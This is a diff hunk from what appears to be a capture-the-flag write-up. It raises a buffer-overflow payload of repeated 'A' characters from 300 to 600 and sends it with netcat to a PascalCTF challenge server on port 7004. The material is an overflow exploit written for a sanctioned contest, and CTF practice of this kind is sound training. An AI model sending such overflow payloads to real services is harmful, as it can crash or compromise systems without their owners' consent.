@@ -35,7 +35,7 @@ I crafted a payload consisting of 300 "A" characters to ensure the stack was suf
 
 ### Execution:
 ```bash
-python3 -c 'print("A"*300)' | nc albo.ctf.pascalctf.it 7004
+python3 -c 'print("A"*600)' | nc albo.ctf.pascalctf.it 7004
 ```
 ## Result:
 
